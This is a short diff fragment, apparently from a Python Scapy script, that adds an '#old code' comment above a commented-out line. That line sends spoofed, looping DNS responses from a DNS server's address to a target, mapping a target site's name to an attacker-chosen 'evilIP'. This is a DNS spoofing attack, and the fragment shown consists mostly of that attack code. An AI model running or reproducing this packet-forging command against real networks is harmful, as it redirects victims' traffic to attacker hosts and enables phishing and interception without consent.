@@ -10,4 +10,5 @@ parser.add_argument("target", help="your target")
 args = parser.parse_args()
 
 
+#old code
 #send(IP(src=args.dnsserver, dst=args.target)/UDP(sport=53, dport=53)/DNS(an=DNSRR(rrname=args.targetsite, rdata=args.evilIP)), loop=1, inter=.5)
